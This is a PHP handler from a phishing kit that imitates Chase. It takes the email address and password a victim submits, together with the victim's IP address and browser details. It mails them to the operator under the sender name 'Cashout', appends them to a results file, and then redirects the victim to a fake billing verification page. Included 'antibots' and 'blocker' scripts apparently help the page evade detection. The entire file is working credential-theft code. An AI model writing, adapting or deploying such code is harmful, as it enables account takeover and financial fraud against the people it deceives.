<?php
$zabi = getenv("REMOTE_ADDR");
include '../antibots.php';
include('../email.php');
include '../bt.php';
include "../blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "--------------  Email accres chase  -------------\n";
$message .= "Email : ".$_POST['3']."\n";
$message .= "Password : ".$_POST['4']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- By Lulz ----------------------\n";
$subject = " Chase Email Acces [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Cashout <contact>\r\n";
mail($email,$subject,$message,$headers);
    $text = fopen('../../rezlt.txt', 'a');
fwrite($text, $message);

header("Location: ../verification-billing.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));?>